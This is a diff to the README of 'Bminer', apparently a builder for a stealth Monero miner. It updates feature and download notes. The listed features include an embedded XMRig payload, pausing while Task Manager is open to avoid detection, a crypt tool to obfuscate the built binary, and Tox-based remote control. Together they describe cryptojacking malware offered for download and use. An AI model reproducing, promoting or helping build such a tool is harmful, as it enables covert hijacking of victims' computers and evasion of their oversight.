@@ -80,8 +80,7 @@ Protect the built binary with **bvm**:
 - Active mining (while the user is at the PC)
 - Separate CPU effort for idle / active
 - TLS pool connection
-- Embed XMRig (CPU)
-- Embed GMiner (GPU)
+- Embed XMRig (CPU only — GPU mining is not supported in this release)
 - Watched processes (pause while Task Manager etc. is open)
 
 **Client options**
@@ -101,16 +100,15 @@ Protect the built binary with **bvm**:
 
 ## Download
 
-Grab `Bminer_release.zip` from [Releases](../../releases). Extract and run `Bminer.exe`.
+Grab `Bminer_SilentXMRMiner_v1.0.0_win64.zip` from [Releases](../../releases). Extract and run `Bminer.exe`.
 
 Keep the DLL folders next to the exe (`platforms`, `imageformats`, `iconengines`, `styles`).
 
 | File | Role |
 |------|------|
-| `Bminer.exe` | Builder |
+| `Bminer.exe` | Builder (build the miner client with one click) |
 | `bvm.exe` | Crypt tool |
-| `Client/bminer.exe` | Miner client |
-| `Client/resources/xmrig.exe` | CPU miner payload |
+| `Client/resources/xmrig.exe` | CPU miner payload, embedded at build time |
 | `Client/tools/toxcli.exe` | Tox helper for Control |
 
 ---
